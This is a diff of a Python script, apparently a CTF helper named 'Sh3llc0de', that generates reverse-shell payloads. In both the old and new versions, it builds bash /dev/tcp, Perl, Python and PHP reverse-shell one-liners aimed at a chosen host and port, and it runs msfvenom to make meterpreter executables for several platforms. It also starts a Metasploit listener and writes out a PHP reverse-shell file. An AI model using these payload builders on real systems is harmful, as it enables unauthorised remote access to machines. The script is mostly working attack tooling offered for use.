@@ -1,258 +1,381 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#title           :shellcode.py
-#description     :Help generate shellcode for a ctf
-#author          :
-#date            :
-#version         :0.1
-#usage           :python shellcode lhost lport
-#=======================================================================
- 
+# title           :shellcode.py
+# description     :Help generate shellcode for a ctf
+# author          :
+# date            :
+# version         :0.1
+# usage           :python shellcode.py lhost lport
+# =======================================================================
+
 # Import the modules needed to run the script.
-import sys, os
+import os
+import query_yes_no
 import pyperclip
-import fileinput
-if len(sys.argv) != 3:
-    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
-    sys.exit(0) 
+import argparse
+import show_ips
+import sys
+from colorama import init
+from termcolor import colored
+from pyfiglet import figlet_format
 
-IP_ADDR = sys.argv[1]
-PORT = sys.argv[2]
-args = (IP_ADDR,PORT)
-# Main definition - constants
-menu_actions  = {}  
+init(strip=not sys.stdout.isatty())
 
- 
-# =======================
-#     MENUS FUNCTIONS
-# =======================
- 
-# Main menu
-def main_menu():
-    os.system('clear')
-    
-    print "Working Directory is /root/ctf/shellcode,\n"
-    print "What code are you looking for?"
-    print "1. Reverse Shells"
-    print "2. TTY Code"
-    print "\n0. Quit"
-    choice = raw_input(" >>  ")
-    exec_menu(choice)
- 
-    return
+parser = argparse.ArgumentParser(description='Build shellcode for multiple platforms.')
 
-# Execute menu
-def exec_menu(choice):
-    os.system('clear')
-    ch = choice.lower()
-    if ch == '':
-        menu_actions['main_menu']()
+parser.add_argument('host', help='Host to use for the shellcode', nargs='?', default="127.0.0.1", type=str)
+parser.add_argument('port', help='Port to use for the shellcode', nargs='?', default=1234, type=int)
+parser.add_argument('--php_filename', help='php filename to save as. (Default:php-reverse-shell.php)',
+                    default='php-reverse-shell.php', type=str)
+parser.add_argument('--msf_file_basename', help='msf basename to save as. (Default: shell)', default='shell', type=str)
+
+args = parser.parse_args()
+
+
+def info(text):
+    return colored(text, "blue")
+
+
+def error(text):
+    return colored(text, "red")
+
+
+def ask(text):
+    return colored(text, "yellow")
+
+
+def reminder(text):
+    return colored(text, "green")
+
+
+def option(text):
+    return colored(text, "cyan")
+
+
+def option2(text):
+    return colored(text, "magenta")
+
+
+def msf_generate(payload):
+    shell_code = "msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s" % (
+        payload['payload'], args.host, args.port, payload['format'], payload['filename'])
+    terminal = 'msfconsole -qx "use exploit/multi/handler;set payload %s;set LHOST %s;set LPORT %s;exploit"' % (
+        payload['payload'], args.host, args.port)
+    print(info("Generating payload: " + shell_code))
+    os.system(shell_code)
+    if query_yes_no.query_yes_no(ask("Do you want to setup the listener?")):
+        os.system(terminal)
     else:
-        try:
-            menu_actions[ch]()
-        except KeyError:
-            print "Invalid selection, please try again.\n"
-            menu_actions['main_menu']()
-    return
+        exit()
 
-# Menu 1
-def menu1():
-    print "20. linux/x86/meterpreter/reverse_tcp"
-    print "21. linux/x64/meterpreter/reverse_tcp" 
-    print "22. windows/meterpreter/reverse_tcp"
-    print "23. windows/x64/meterpreter/reverse_tcp" 
-    print "24. php/meterpreter_reverse_tcp"
-    print "25. python/meterpreter/reverse_tcp"
-    print "26. Bash Oneliner"
-    print "27. Perl Oneliner"
-    print "28. Python Oneliner"
-    print "29. PHP Oneliner"
-    print "30. PHP Oneliner v2"
-    print "31. Edit pentestmonkey's php file"
-    print "32. java/jsp_shell_reverse_tcp WAR file"
-    print "9. Back"
-    print "0. Quit"
-    choice = raw_input(" >>  ")
-    exec_menu(choice)
-    return
- 
- 
-# Menu 2
-def menu2():
-    print "Which one do you want copied to clipboard\n"
-    print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
-    print "11. python -c 'import pty; pty.spawn(\"/bin/bash\")'"
-    print "12. echo os.system('/bin/bash')"
-    print "13. /bin/sh -i"
-    print "14. perl: exec \"/bin/sh\";"
-    print "9. Back"
-    print "0. Quit" 
-    choice = raw_input(" >>  ")
-    exec_menu(choice)
-    return
- 
-# Back to main menu
-def back():
-    menu_actions['main_menu']()
- 
-# Exit program
-def exit():
-    sys.exit()
 
-# python tty
-def python_tty():
-    shellcode = 'python -c \'import pty; pty.spawn("/bin/sh")\''
-    oneliner(shellcode)
+def php_file_pentestmonkey(payload=None):
+    filename = args.php_filename
+    dir = getcwd()
+    fin = open(dir + "/php-reverse-shell-template.php")
+    fout = open(filename, "wt")
+    for line in fin:
+        if '127.0.0.1' in line:
+            fout.write(line.replace('127.0.0.1', str(args.host)))
+        elif '1234' in line:
+            fout.write(line.replace('1234', str(args.port)))
+        else:
+            fout.write(line)
+    fin.close()
+    fout.close()
+    print(info("File created and updated as: " + filename))
 
-def python_tty_v2():
-    shellcode = 'python -c \'import pty; pty.spawn("/bin/bash")\''
-    oneliner(shellcode)
-
-#bash tty code	
-def bash_tty():
-    shellcode = 'echo os.system(\'/bin/bash\')'
-    oneliner(shellcode)
-
-#bin code	
-def bin_tty():
-    shellcode = '/bin/sh -i'
-    oneliner(shellcode)
-
-#perl code
-def perl_tty():
-    shellcode = 'perl: exec "/bin/sh";'
-    oneliner(shellcode)
-
-#Linux x86 Meterpreter Menu 20
-def linux_x86_meterpreter_reverse_tcp():
-    shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % args
-    msfvenom(shellcode)
-
-#Linux x64 Meterpreter Menu 21
-def linux_x64_meterpreter_reverse_tcp():
-    shellcode = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell64.elf" % args
-    msfvenom(shellcode)
-
-#Windows x64 Meterpreter Menu 22
-def windows_meterpreter_reverse_tcp():
-    shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" % args
-    msfvenom(shellcode)
-
-#Windows x64 Meterpreter Menu 23
-def windows_x64_meterpreter_reverse_tcp():
-    shellcode = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell64.exe" % args
-    msfvenom(shellcode)
-
-#PHP Meterpreter Menu 24
-def php_meterpreter_reverse_tcp():
-    shellcode = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
-    msfvenom(shellcode)
-
-#Python Metepreter Menu 25
-def python_meterpreter_reverse_tcp(): 
-    shellcode = "msfvenom -p python/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.py" % args
-    msfvenom(shellcode)
-
-#Bash Oneliner Menu 26
-def bash_oneliner():
-	shellcode = 'bash -i >& /dev/tcp/%s/%s 0>&1' % args
-	oneliner(shellcode)
-
-#Python Oneliner Menu 27
-def perl_oneliner():
-	shellcode = 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % args
-	oneliner(shellcode)
-
-#Python Oneliner Menu 28
-def python_oneliner():
-	shellcode = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % args
-	oneliner(shellcode)
-
-#PHP Oneliner Menu 29
-def php_oneliner():
-	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
-	oneliner(shellcode)
-
-def php_oneliner_v2():
-    shellcode = 'php -r \'$sock = fsockopen("%s",%s); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \'' % args
-    oneliner(shellcode)
-
-#PHP java/jsp_shell_reverse_tcp WAR 31
-def java_war():
-    shellcode = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war" % args
-    oneliner(shellcode)
 
 # Other resources
 # http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
 
-#MSFVENOM shortcode
-def msfvenom(shellcode):
-    warning ="Make sure you are using the correct payload in MSFConsole"
-    os.system('clear')
-    print "Writing Shell"
-    print shellcode
-    os.system(shellcode)
-    print warning
+# One liner shortcode
+def oneliner(payload):
+    print(info(payload['payload'] + " Copied to clipboard"))
+    pyperclip.copy(payload['payload'])
+    if 'tty' in payload and payload['tty'] is True:
+        print(reminder("\nRemember:"))
+        print(reminder("<ctrl+z> # to background"
+                       "\nstty raw -echo"
+                       "\nfg<enter>"
+                       "\n<enter>"
+                       "\n<enter>"
+                       "\n# optional: export TERM=vt100"))
+    exit()
 
-#One liner shortcode
-def oneliner(shellcode):
-	print shellcode + " Copied to clipboard"
-	pyperclip.copy(shellcode)
-	sys.exit
 
-#Edit PHP Monkey's File	Menu 30
-def php_file_pentestmonkey():
-        filename = "php-reverse-shell.php"
-	fin = open("/root/tools/shellcode/php-reverse-shell-template.php")
-	fout = open(filename, "wt")
-	for line in fin:
-            if '127.0.0.1' in line :
-                fout.write( line.replace('127.0.0.1', IP_ADDR) )
-            elif '1234' in line:
-                fout.write( line.replace('1234', PORT) )
-            else:    
-                fout.write(line)
-	fin.close()
-	fout.close()
-        print "File created and updated as: " + filename
+payloads = [
+    {
+        'title': 'Reverse Shells',
+        'generate_title': 'Select a payload to generate',
+        'function': {'function_name': msf_generate},
+        'submenu': [
+            {
+                "title": "",
+                "payload": "linux/x86/meterpreter/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + ".elf"
+            },
+            {
+                "title": "",
+                "payload": "linux/x64/shell/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + "_64.elf"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_nonx_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/x64/meterpreter/reverse_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + "_64.exe"
+            },
+            {
+                "title": "",
+                "payload": "osx/x86/shell_reverse_tcp",
+                "format": "macho",
+                "filename": args.msf_file_basename + ".dmg"
+            },
+            {
+                "title": "",
+                "payload": "osx/x64/shell_reverse_tcp",
+                "format": "macho",
+                "filename": args.msf_file_basename + "_64.dmg"
+            },
+            {
+                "title": "",
+                "payload": "php/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".php"
+            },
+            {
+                "title": "",
+                "payload": "python/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".py"
+            },
+            {
+                "title": "",
+                "payload": "java/jsp_shell_reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".jsp"
+            },
+            {
+                "title": "",
+                "payload": "java/jsp_shell_reverse_tcp",
+                "format": "war",
+                "filename": args.msf_file_basename + ".war"
+            },
+            {
+                "title": "",
+                "payload": "java/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".war"
+            },
+            {
+                "title": "",
+                "payload": "cmd/unix/reverse_bash",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".sh"
+            },
+            {
+                "title": "",
+                "payload": "cmd/windows/powershell_reverse_tcp",
+                "format": "ps1",
+                "filename": args.msf_file_basename + ".ps1"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_http",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_https",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                'title': 'Bash Oneliner',
+                'payload': 'bash -i >& /dev/tcp/{host}/{port} 0>&1'.format(host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'Perl Oneliner',
+                'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (
+                    args.host, args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'Python Oneliner',
+                'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'PHP Oneliner',
+                'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'PHP Oneliner V2',
+                'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': '',
+                'payload': 'Generate PHP file pentest monkey',
+                'function': {'function_name': php_file_pentestmonkey}
+            },
+        ]
+    },
+    {
+        'title': 'TTY Code',
+        'generate_title': 'Select a TTY to generate',
+        'function': {'function_name': oneliner},
+        'submenu': [
+            {
+                'title': '',
+                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\'',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\'',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\'',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': 'echo os.system(\'/bin/bash\')',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': '/bin/sh -i',
+                'tty': True
+            },
+            {
+                'title': '',
+                'payload': 'perl: exec "/bin/sh";',
+                'tty': True
+            },
+        ]
+    }
+]
 
-# =======================
-#    MENUS DEFINITIONS
-# =======================
- 
-# Menu definition
-menu_actions = {
-	'main_menu': main_menu,
-    '1': menu1,
-    '2': menu2,
-    '10': python_tty,
-    '11': python_tty_v2,
-    '12': bash_tty,
-    '13': bin_tty,
-    '14': perl_tty,
-    '20': linux_x86_meterpreter_reverse_tcp,
-    '21': linux_x64_meterpreter_reverse_tcp,
-    '22': windows_meterpreter_reverse_tcp,
-    '23': windows_x64_meterpreter_reverse_tcp,
-    '24': php_meterpreter_reverse_tcp,
-    '25': python_meterpreter_reverse_tcp,
-    '26': bash_oneliner,
-    '27': perl_oneliner,
-    '28': python_oneliner,
-    '29': php_oneliner,
-    '30': php_oneliner_v2,
-    '31': php_file_pentestmonkey,
-    '32': java_war,
-    '9': back,
-    '0': exit,
-}
 
- 
-# =======================
-#      MAIN PROGRAM
-# =======================
- 
+def cls():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def getcwd():
+    return os.path.dirname(os.path.realpath(__file__))
+
+
+def main_menu(clear=True, items=None):
+    if clear is True:
+        cls()
+    print(info("Working Directory is {dir}\n".format(dir=os.getcwd())))
+    print(ask("Please select a menu option below:"))
+    for index, value in enumerate(items):
+        print(option(str(index) + ": " + value['title']))
+    footer(items)
+
+
+# Execute menu
+def exec_menu(choice, item=None):
+    cls()
+    ch = choice.lower()
+    if ch == '' or ch == "00" or ch == "99":
+        if ch == '' or ch == "99":
+            main_menu(clear=True, items=payloads)
+        elif ch == "00":
+            exit()
+    else:
+        try:
+            if item is None:
+                raise KeyError
+            if 'submenu' in item:
+                handle_payloads(item)
+        except KeyError:
+            print(error("Invalid selection, please try again.\n"))
+            main_menu(clear=False, items=payloads)
+    return
+
+
+def footer_text():
+    print(option2("\n99. Home"))
+    print(option2("00. Quit"))
+
+
+def footer(menu_items):
+    footer_text()
+    choice = input(ask(" >>  "))
+    selected_item = None
+    for index, value in enumerate(menu_items):
+        if choice == str(index):
+            selected_item = value
+    exec_menu(choice, selected_item)
+    return
+
+
+def handle_payloads(item):
+    print(ask(item['generate_title']))
+    for index, value in enumerate(item['submenu']):
+        if value['title'] != '':
+            print(option(str(index) + ": " + value['title']))
+        else:
+            print(option(str(index) + ": " + value['payload']))
+    footer_text()
+    choice = input(ask(" >>  "))
+    if choice == "00" or choice == "99":
+        exec_menu(choice)
+        return
+    selected_payload = None
+    for index, value in enumerate(item['submenu']):
+        if choice == str(index):
+            selected_payload = value
+    try:
+        if selected_payload is None:
+            raise ValueError
+        # try function on individual items
+        if 'function' in selected_payload and selected_payload['function'] is not None \
+                and selected_payload['function']['function_name'] is not None:
+            selected_payload['function']['function_name'](selected_payload)
+            return
+        # try main function that is defined fallback to main function
+        elif 'function' in item and item['function'] is not None and item['function']['function_name'] is not None:
+            item['function']['function_name'](selected_payload)
+            return
+        return
+    except ValueError:
+        print(error("Something went wrong please try again."))
+        handle_payloads(item)
+
+
 # Main Program
 if __name__ == "__main__":
     # Launch main menu
-    main_menu()
+    cls()
+
+    print(info(figlet_format("Sh3llc0de", font="standard")))
+    print(ask("\nCreated By: jiveturkey and weirdatfirst"))
+    show_ips.show_ips()
+    main_menu(clear=False, items=payloads)
